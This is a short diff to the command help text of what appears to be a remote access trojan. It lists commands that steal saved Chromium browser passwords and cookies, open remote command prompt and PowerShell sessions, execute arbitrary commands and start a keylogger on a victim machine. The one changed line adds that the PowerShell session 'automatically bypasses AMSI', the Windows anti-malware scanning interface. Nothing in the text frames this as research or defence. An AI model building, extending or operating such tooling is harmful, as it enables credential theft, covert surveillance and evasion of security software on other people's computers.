@@ -35,7 +35,7 @@ getlogins {unique_id} : Get saved Chromium-based browser passwords on specified 
 getcookies {unique_id} : Get saved Chromium-based browser cookies on specified machine.
 
 shell {unique_id} : Start remote command prompt session on specified machine.
-powershell {unique_id} : Start remote PowerShell session on specified machine.
+powershell {unique_id} : Start remote PowerShell session on specified machine (automatically bypasses AMSI).
 execute {unique_id} {command} : Execute command on specified machine.
 
 startkeylogger {unique_id} : Start keylogger on specified machine.
